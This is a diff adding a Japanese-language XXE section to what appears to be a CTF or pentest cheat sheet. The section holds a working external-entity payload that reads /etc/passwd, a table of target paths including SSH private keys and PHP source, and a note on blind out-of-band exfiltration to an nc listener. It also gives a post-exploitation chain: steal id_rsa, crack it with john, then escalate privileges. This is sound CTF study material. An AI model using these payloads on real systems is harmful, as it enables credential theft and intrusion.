@@ -27,6 +27,54 @@ grep -R "flag" .
 rg "flag"
 ```
 
+## XML / XXE
+
+XML を受け付けるフォーム・API で **外部エンティティ** を悪用し、サーバー上のファイル読み取り（場合により SSRF）をする。
+
+### Classic（結果が画面に出る）
+
+レスポンスのプレビュー欄（`name` / `author` / `comment` 等）に `&xxe;` の展開結果が載るパターン。
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<comment>
+  <name>x</name>
+  <author>&xxe;</author>
+  <comment>x</comment>
+</comment>
+```
+
+- まず平文 XML で **どのタグがどの欄に出るか** 確認してから `&xxe;` を入れる
+- `SYSTEM` の URI を変えるだけで別ファイルを読める
+
+### よく読むパス
+
+| 目的 | 例 |
+|------|-----|
+| ユーザー列挙 | `file:///etc/passwd` |
+| SSH 鍵 | `file:///home/<user>/.ssh/id_rsa` |
+| フラグ | `file:///home/<user>/user.txt` |
+| ヒント | `~/.bash_history`, Web 配下の `*.php` |
+| PHP ソース | `php://filter/convert.base64-encode/resource=/var/www/html/index.php`（環境次第） |
+
+### 読めないことが多いもの
+
+- `/etc/shadow` — www-data 等の権限外
+- `php://filter` — `allow_url_include` Off や libxml の制限で失敗しがち
+
+### Blind（画面に出ない）
+
+OOB: 外部 DTD + パラメータエンティティで Collaborator / `nc -lvnp 80` へ exfil。Classic で取れるなら不要。
+
+### 侵入後の定番（Mustacchio 等）
+
+1. passwd → 実ユーザー特定（`/bin/bash`）
+2. XXE で `id_rsa` → `ssh2john` + `john`（鍵が ENCRYPTED のとき）
+3. シェル後は [権限昇格系](#権限昇格系)（カスタム SUID・`sudo -l` 等）
+
 ## 権限昇格の事前準備
 
 ### ユーザ確認
